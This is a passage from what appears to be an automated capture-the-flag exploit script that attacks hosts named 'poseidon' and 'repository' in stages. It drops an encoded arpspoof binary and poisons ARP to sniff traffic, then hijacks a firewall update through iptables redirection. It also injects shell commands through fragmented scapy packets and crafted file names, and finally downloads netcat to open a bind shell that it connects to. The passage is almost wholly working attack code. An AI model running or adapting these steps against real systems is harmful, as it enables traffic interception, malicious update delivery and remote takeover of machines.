AAAAAAAAAAAAAAAAAAAAAFwtAAAAAAAADAEAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAB
AAAAAgAAAAAAAAAAAAAAAAAAAAAAAADoIAAAAAAAAIgIAAAAAAAAHgAAADAAAAAIAAAAAAAAABgA
AAAAAAAACQAAAAMAAAAAAAAAAAAAAAAAAAAAAAAAcCkAAAAAAADsAwAAAAAAAAAAAAAAAAAAAQAA
AAAAAAAAAAAAAAAAAA==
'''
write(payload,'o')
print("[-] Done!")
c.sendline('base64 -d o > arpspoof')
c.expect(promts,timeout=None)
c.sendline('chmod +x arpspoof')
c.expect(promts,timeout=None)
print("[*] poisoning poseidon")
payload='''echo 1 > /proc/sys/net/ipv4/ip_forward & ./arpspoof -i eth0 -t `cat /etc/hosts | grep "poseidon" | awk '{ print $1 }'` -s `cat /etc/hosts | grep "repository" | awk '{ print $1 }'` > /dev/null &'''
c.sendline(payload)
c.expect(promts,timeout=None)
print("[-] Done!")
print("[*] dumping flag")
c.sendline('''tcpdump -A host `cat /etc/hosts | grep "repository" | awk '{ print $1 }'` and not arp | grep -m 1 "STAGE2_"| head -n1''')
c.expect("X-Flag: ",timeout=None)
c.expect(promts,timeout=None)
print("")
print(c.before.splitlines()[0])
print("")
time.sleep(3)
print("[-] stage2 completed!")
print("[*] pwning stage3")
#stage3
c.sendline("mkdir firewallUpdate")
c.expect(promts,timeout=None)
c.sendline("curl repository/firewallUpdate/v0.0.11.bin > firewallUpdate/latest.bin")
c.expect(promts,timeout=None)
c.sendline("curl repository/firewallUpdate/v0.0.11.bin.sig > firewallUpdate/latest.sig")
c.expect(promts,timeout=None)
c.sendline("sysctl -w net.ipv4.conf.eth0.route_localnet=1")
c.expect(promts,timeout=None)
c.sendline("iptables -t nat -A PREROUTING -p tcp --dport 80 -i eth0 -j DNAT --to 127.0.0.1:8000")
c.expect(promts,timeout=None)
c.sendline("python3 -m http.server 2>/dev/null &")
c.expect(promts,timeout=None)
payload='''from scapy.all import *
payload = "'|cat<f*'"
while True:
    pkt = Ether()/IP(dst=Net('poseidon'))/UDP(dport=4000, sport=1337)/Raw(load=("monitor %s"%(payload)).encode())
    pkts = fragment(pkt.__class__(pkt.build()),fragsize=8)
    r = srp([pkt.__class__(_.build()) for _ in pkts],timeout=1)[0]
    if not r:
        print("no response")
    for n in r:
        l = n[1].lastlayer()
        if(l.__class__ == Raw):
            print(l.load.decode())
    try:
        payload = input(": ")
    except KeyboardInterrupt:
        break
    except:
        pass
'''
write(payload,'t',2)
print("[-] stage3 completed")
c.sendline(r"cp `which nc` .")
c.expect(promts,timeout=None)
print("pls wait...")
time.sleep(5)
#stage4
payload='''
curl repository/nc > nc
chmod +x nc
./nc -lp31337 -e/bin/sh &
'''
c.sendline(r"rm firewallUpdate/latest.bin")
c.expect(promts,timeout=None)
write(payload,'firewallUpdate/latest.bin',2)
print("[*] dumping flag")
c.sendline("python3 t")
c.expect("FINAL_",timeout=None)
c.expect(': ',timeout=None)
print("")
print("FINAL_"+c.before.splitlines()[0])
print("")
print("[*] preparing filesystem..")
c.sendline(r"'>\$a\;cd'")
c.expect(': ',timeout=None)
c.sendline(r"'>\$z\?un'")
c.expect(': ',timeout=None)
c.sendline(r"'>\>a\;\#'")
c.expect(': ',timeout=None)
c.sendline(r"'>\$b\;sh'")
c.expect(': ',timeout=None)
c.sendline(r"'>\'\'fi*'")
c.expect(': ',timeout=None)
c.sendline(r"'>\>b\&\#'")
c.expect(': ',timeout=None)
c.sendline(r"'>\$c\;\#'")
c.expect(': ',timeout=None)
c.sendline(r"'>\'\'g'")
print("[-] Done!")
c.expect(': ',timeout=None)
c.sendline(r"'|dir>z'")
print("[*] executing payload..")
c.expect(': ',timeout=None)
c.sendline(r"'|{sh,z}'")
c.expect(': ',timeout=None)
print("[-] Done!")
for i in range(0,3):
    c.send(chr(3))
    c.send(chr(3))
    c.expect(promts,timeout=1)
    c.send(chr(3))
    c.send(chr(3))
    c.expect(promts,timeout=1)
print("[*] connecting to shell")
c.sendline('nc poseidon 31337')
c.interact()
